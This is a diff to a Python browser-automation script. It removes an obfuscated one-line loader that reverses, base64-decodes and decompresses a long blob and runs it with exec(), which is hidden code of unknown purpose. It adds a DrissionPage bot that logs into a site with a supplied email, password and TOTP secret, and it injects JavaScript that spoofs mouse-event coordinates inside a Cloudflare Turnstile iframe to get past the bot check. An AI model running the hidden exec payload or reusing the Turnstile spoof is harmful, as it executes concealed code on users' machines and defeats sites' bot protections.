@@ -1,1 +1,109 @@
-_ = lambda __ : __import__('zlib').decompress(__import__('base64').b64decode(__[::-1]));exec((_)(b'=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'))
+from DrissionPage import ChromiumPage, ChromiumOptions
+from DrissionPage.common import Actions
+import argparse
+import pyotp
+# Requires pip install DrissionPage==4.1.0.0b2! (China number 1!!1!!)
+# Set up argument parsing
+parser = argparse.ArgumentParser(description='Run browser automation with custom settings.')
+parser.add_argument('--port', type=int, default=9222, help='Local port number for the browser connection.')
+parser.add_argument('--email', type=str, required=True, help='Login email.')
+parser.add_argument('--password', type=str, required=True, help='Login password.')
+parser.add_argument('--totp_secret', type=str, required=True, help='TOTP secret key for generating OTP codes.')
+
+args = parser.parse_args()
+
+# Generate the current OTP code
+totp = pyotp.TOTP(args.totp_secret)
+current_otp = totp.now()
+
+#JS Code for CF Fix.
+js_code = """
+function getRandomInt(min, max) {
+    return Math.floor(Math.random() * (max - min + 1)) + min;
+}
+let screenX = getRandomInt(800, 1200);
+let screenY = getRandomInt(400, 600);
+Object.defineProperty(MouseEvent.prototype, 'screenX', { value: screenX });
+Object.defineProperty(MouseEvent.prototype, 'screenY', { value: screenY });
+"""
+
+try:
+    co = ChromiumOptions().set_local_port(args.port)  # Use the port number from arguments
+    page = ChromiumPage(addr_or_opts=co)
+
+    page.wait.load_start()
+    
+    # Wait for cookie consent dialog and click it
+    allow_all_btn = page.ele("#CybotCookiebotDialogBodyLevelButtonLevelOptinAllowAll", timeout=10)
+    if allow_all_btn:
+        print("Cookie consent button found. Clicking Allow All...")
+        allow_all_btn.click()
+        sleep(3)
+    else:
+        print("Cookie consent button not found or already dismissed.")
+
+    # New_ Cloudflare with injection
+    sleep(4)
+    challengeSolution = page.ele("@name=cf-turnstile-response")
+    challengeWrapper = challengeSolution.parent()
+    challengeIframe = challengeWrapper.shadow_root.ele("tag:iframe")
+    challengeIframe.run_js(js_code)
+    challengeIframeBody = challengeIframe.ele("tag:body").shadow_root
+    challengeButton = challengeIframeBody.ele("tag:input")
+    challengeButton.click()
+
+    # Check if the email field exists
+    email_field = page.ele('#email')  # Adjust the selector if necessary
+    if email_field:
+        print("Email field found. Entering email...")
+        email_field.input(args.email)
+        # Click on the continue button after entering the email
+        continue_button = page.ele('#continue-with-assisted-via-email-flow')
+        if continue_button:
+            print("Continue button found. Clicking...")
+            continue_button.click()
+        else:
+            print("Continue button not found.")
+            
+        # Wait for password field and enter the password
+        password_field = page.ele('#password', timeout=10)  # Adjust timeout as needed
+        if password_field:
+            print("Password field found. Entering password...")
+            password_field.input(args.password)
+            # Click on the login button after entering the password
+            login_button = page.ele('#assisted-login--credentials-form--continue-button')
+            if login_button:
+                print("Login button found. Clicking...")
+                login_button.click()
+            else:
+                print("Login button not found.")
+        else:
+            print("Password field not found.")
+        
+        # Click on the continue with TOTP MFA button
+        mfa_continue_button = page.ele('@data-testid=continue-with-totp-mfa', timeout=10)
+        if mfa_continue_button:
+            print("MFA Continue button found. Clicking...")
+            mfa_continue_button.click()
+        else:
+            print("MFA Continue button not found.")
+        
+        # Wait for TOTP input field and enter the OTP code
+        totp_field = page.ele('#totp-verify-form--input-code', timeout=10)
+        if totp_field:
+            print("TOTP field found. Entering OTP code...")
+            totp_field.input(current_otp)  # Enter the dynamically generated OTP code
+            # Click on the continue button after entering the OTP code
+            totp_continue_button = page.ele('#totp-verify-form--button-continue')
+            if totp_continue_button:
+                print("TOTP Continue button found. Clicking...")
+                totp_continue_button.click()
+            else:
+                print("TOTP Continue button not found.")
+        else:
+            print("TOTP field not found.")
+    else:
+        print("Email field not found.")
+
+except Exception as e:
+    print(f"Failed to connect to the browser: {e}")
